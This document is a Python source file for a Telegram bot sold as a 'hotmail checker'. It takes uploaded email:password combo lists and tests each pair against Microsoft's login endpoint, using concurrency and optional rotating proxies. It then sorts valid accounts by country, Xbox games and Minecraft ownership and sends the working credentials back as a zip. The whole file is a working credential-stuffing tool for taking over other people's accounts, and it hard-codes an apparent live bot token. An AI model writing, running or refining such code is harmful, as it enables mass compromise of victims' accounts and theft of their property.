import asyncio
import aiohttp
import base64
import json
import logging
import os
import random
import re
import time
import zipfile
import shutil
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]

# SET THIS TO FALSE TO USE RENDER'S CLEAN IP (True to use the free list)
USE_PROXIES = False 

MAX_CONCURRENT = 20
TIMEOUT = 25
TEMP_DIR = "./temp"

MS_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
PROFILE_URL = "https://profile.xboxlive.com/users/xuid({xuid})/profile/settings"
TITLES_URL = "https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
MC_LOGIN_URL = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"

CLIENT_ID = "00000000402B5328"
SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

# ============================================================
# PROXY FETCHER
# ============================================================
async def fetch_proxies() -> list:
    if not USE_PROXIES: return []
    url = "https://freeproxiesbyvortex.lovable.app/proxies"
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                html = await resp.text()
        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
        matches = re.findall(pattern, html)
        seen = set()
        for m in matches:
            if m not in seen:
                seen.add(m)
                proxies.append(f"http://{m}")
    except Exception as e:
        log.error(f"Proxy fetch failed: {e}")
    return proxies

PROXIES = []
def pick_proxy():
    if PROXIES and USE_PROXIES:
        return random.choice(PROXIES)
    return None

# ============================================================
# HELPERS & AUTH CHAIN
# ============================================================
def decode_jwt_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) < 2: return {}
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception: return {}

TLD_COUNTRY = {
    "co.uk": "GB", "uk": "GB", "fr": "FR", "de": "DE", "it": "IT", "es": "ES",
    "mx": "MX", "jp": "JP", "br": "BR", "pt": "PT", "co.za": "ZA",
    "com.au": "AU", "au": "AU", "co.th": "TH", "th": "TH", "co.kr": "KR",
    "kr": "KR", "sg": "SG", "eg": "EG", "hu": "HU", "ru": "RU", "se": "SE",
    "dk": "DK", "nl": "NL", "be": "BE", "fi": "FI", "ch": "CH", "at": "AT",
    "ie": "IE", "ca": "CA", "cl": "CL", "ar": "AR", "co": "CO", "pe": "PE",
    "ve": "VE", "in": "IN", "cn": "CN", "tw": "TW", "hk": "HK", "il": "IL",
    "sa": "SA", "ae": "AE", "tr": "TR", "pl": "PL", "cz": "CZ", "gr": "GR",
}

def detect_country(email: str, jwt_country: str = "") -> str:
    if jwt_country: return jwt_country.upper()
    dom = email.split("@")[-1].lower()
    for suffix, code in sorted(TLD_COUNTRY.items(), key=lambda x: -len(x[0])):
        if dom.endswith("." + suffix): return code
    return "US"

async def ms_ropc(session, email, password):
    payload = {"client_id": CLIENT_ID, "scope": SCOPE, "grant_type": "password", "username": email, "password": password}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    proxy = pick_proxy()
    try:
        async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            body = await r.text()
            if r.status == 200: return {"ok": True, "data": await r.json()}
            
            # Grab the exact error message from Microsoft
            err_msg = ""
            try:
                err_json = await r.json()
                err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
            except:
                err_msg = body[:50]

            low = body.lower()
            if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
            if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
            if r.status == 429: return {"ok": False, "kind": "RATE"}
            return {"ok": False, "kind": "BAD", "detail": err_msg}
            
    except Exception as e: return {"ok": False, "kind": "ERR", "detail": str(e)}

async def xbox_user_auth(session, ms_access):
    payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={ms_access}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
    headers = {"Content-Type": "application/json", "Accept": "application/json", "x-xbl-contract-version": "1"}
    try:
        async with session.post(XBL_AUTH_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200: return (await r.json()).get("Token")
    except Exception: pass
    return None

async def xsts_auth(session, xbl_token, relying_party):
    payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]}, "RelyingParty": relying_party, "TokenType": "JWT"}
    headers = {"Content-Type": "application/json", "Accept": "application/json", "x-xbl-contract-version": "1"}
    try:
        async with session.post(XSTS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                xui = data.get("DisplayClaims", {}).get("xui", [])
                if xui: return {"token": data.get("Token"), "uhs": xui[0].get("uhs", ""), "xuid": xui[0].get("xid", "")}
    except Exception: pass
    return None

async def xbox_profile(session, xsts_token, uhs, xuid):
    url = PROFILE_URL.format(xuid=xuid) + "?settings=Gamertag,Gamerscore,GameDisplayPicRaw"
    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}
    try:
        async with session.get(url, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                settings = {s["id"]: s["value"] for s in data.get("profileUsers", [{}])[0].get("settings", [])}
                return {"gamertag": settings.get("Gamertag", ""), "gamerscore": settings.get("Gamerscore", "0")}
    except Exception: pass
    return {}

async def xbox_game_count(session, xsts_token, uhs, xuid):
    url = TITLES_URL.format(xuid=xuid)
    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}
    try:
        async with session.get(url, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                titles = (await r.json()).get("titles", [])
                return sum(1 for t in titles if t.get("titleType") == "Game")
    except Exception: pass
    return 0

async def check_minecraft(session, xbl_token):
    xsts = await xsts_auth(session, xbl_token, "rp://api.minecraftservices.com/")
    if not xsts: return None
    try:
        async with session.post(MC_LOGIN_URL, json={"identityToken": f"XBL3.0 x={xsts['uhs']};{xsts['token']}"}, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status != 200: return None
            mc_token = (await r.json()).get("access_token")
        if not mc_token: return None
        async with session.get(MC_PROFILE_URL, headers={"Authorization": f"Bearer {mc_token}"}, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200: return (await r.json()).get("name") or "has_mc"
    except Exception: pass
    return None

async def check_account(session, email, password):
    result = {"email": email, "password": password}
    ropc = await ms_ropc(session, email, password)
    if not ropc["ok"]:
        result["status"] = ropc["kind"]
        result["detail"] = ropc.get("detail", "")
        return result
    result["status"] = "HIT"
    ms_access = ropc["data"].get("access_token", "")
    jwt = decode_jwt_payload(ms_access)
    result["country"] = detect_country(email, jwt.get("ctry", "") or jwt.get("country", ""))
    xbl_token = await xbox_user_auth(session, ms_access)
    result.update({"gamertag": "", "gamerscore": "0", "xuid": "", "games": 0, "minecraft": None})
    if xbl_token:
        xsts = await xsts_auth(session, xbl_token, "http://xboxlive.com")
        if xsts:
            result["xuid"] = xsts["xuid"]
            profile = await xbox_profile(session, xsts["token"], xsts["uhs"], xsts["xuid"])
            result["gamertag"] = profile.get("gamertag", "")
            result["gamerscore"] = profile.get("gamerscore", "0")
            result["games"] = await xbox_game_count(session, xsts["token"], xsts["uhs"], xsts["xuid"])
        result["minecraft"] = await check_minecraft(session, xbl_token)
    return result

# ============================================================
# PROCESSING & TELEGRAM
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results, done, total, t_start, last_edit = [], 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            async with sem: r = await check_account(session, email, password)
            results.append(r); done += 1
            now = time.time()
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "HIT")
                tfa = sum(1 for x in results if x["status"] == "2FA")
                bad = sum(1 for x in results if x["status"] == "BAD")
                ban = sum(1 for x in results if x["status"] == "BANNED")
                err = sum(1 for x in results if x["status"] in ("ERR", "RATE"))
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nhits: <b>{hits}</b> | 2fa: <b>{tfa}</b> | banned: <b>{ban}</b>\nbad: <b>{bad}</b> | err: <b>{err}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code> | {elapsed:.1f}s", parse_mode=ParseMode.HTML)
                except Exception: pass
        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    hits = [r for r in results if r["status"] == "HIT"]
    bad = [r for r in results if r["status"] == "BAD"]
    tfa = [r for r in results if r["status"] == "2FA"]
    banned = [r for r in results if r["status"] == "BANNED"]
    errors = [r for r in results if r["status"] in ("ERR", "RATE")]
    country_buckets = {}
    for r in hits: country_buckets.setdefault(r["country"], []).append(r)
    ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
    
    # This is the important part: write WHY it went bad
    write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
    
    write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
    write_file("banned.txt", [f"{r['email']}:{r['password']}" for r in banned])
    write_file("errors.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in errors])
    
    write_file("xbox_games.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['games']} games" for r in hits if r["games"] > 0])
    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r["minecraft"]])
    
    for ccode, items in country_buckets.items(): write_file(f"{ccode}.txt", [f"{r['email']}:{r['password']}" for r in items])
    write_file("summary.txt", [f"Module: hotmail", f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Hits: {len(hits)}", f"Bad: {len(bad)}", f"2FA: {len(tfa)}", f"Banned: {len(banned)}", f"Errors: {len(errors)}", f"Elapsed: {elapsed:.1f}s"])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nhits: <b>{len(hits)}</b>\n2fa: <b>{len(tfa)}</b>\nbanned: <b>{len(banned)}</b>\nbad: <b>{len(bad)}</b>\nerrors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(hits)}_hits.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
    await msg.answer("<b>hotmail checker</b>\n\nsend a .txt file with <code>email:password</code> combos\none per line.")

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e: return await status.edit_text(f"download failed: {e}")
    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p: combos.append((e, p))
    os.remove(local)
    if not combos: return await status.edit_text("no valid combos found.")
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
    await process_combos(combos, msg.chat.id, status, bot)

# ============================================================
# WEB SERVER FOR RENDER FREE TIER
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    
    global PROXIES
    PROXIES = await fetch_proxies()
    log.info(f"starting | proxies={len(PROXIES)}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
